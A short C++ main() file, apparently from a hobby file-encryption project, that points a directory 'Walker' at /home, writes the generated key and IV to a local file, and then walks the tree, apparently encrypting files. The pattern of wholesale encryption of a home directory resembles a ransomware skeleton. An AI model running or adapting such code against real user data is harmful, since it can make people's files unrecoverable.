#include <iostream>
#include "cryptographer.hpp"
#include "walker.hpp"
#include <fstream>

int main(int argc, char **argv) {

    auto coolCryptor(std::make_shared<Cryptographer>());

    Walker shadowWalker("/home", coolCryptor);
   // coolCryptor->willEncrypt(correctInput.wannaEncrypt());
    //shadowWalker.walk(correctInput.isRecursive());

    shadowWalker.setCmdArgs(argc, argv);
    auto saveKey(static_cast<std::ofstream>("confidential.dat"));
    saveKey << coolCryptor->getKey() + coolCryptor->getIV();
    saveKey.close();
    shadowWalker.walk();
//    std::cout << "KEY.... DON'T LOSE IT >>>>>>>>>>>>>>> " 
  //            << coolCryptor->getKey() + coolCryptor->getIV() << std::endl;
     

    return 0;
}
